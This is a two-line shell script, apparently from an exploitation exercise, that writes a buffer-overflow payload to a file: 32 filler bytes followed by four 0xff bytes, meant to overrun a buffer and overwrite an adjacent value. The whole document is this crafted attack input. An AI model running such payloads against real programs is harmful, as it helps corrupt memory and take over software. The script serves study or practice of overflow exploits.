#!/bin/bash
python2 -c 'print 32*"A" + "\xff\xff\xff\xff"' > payload
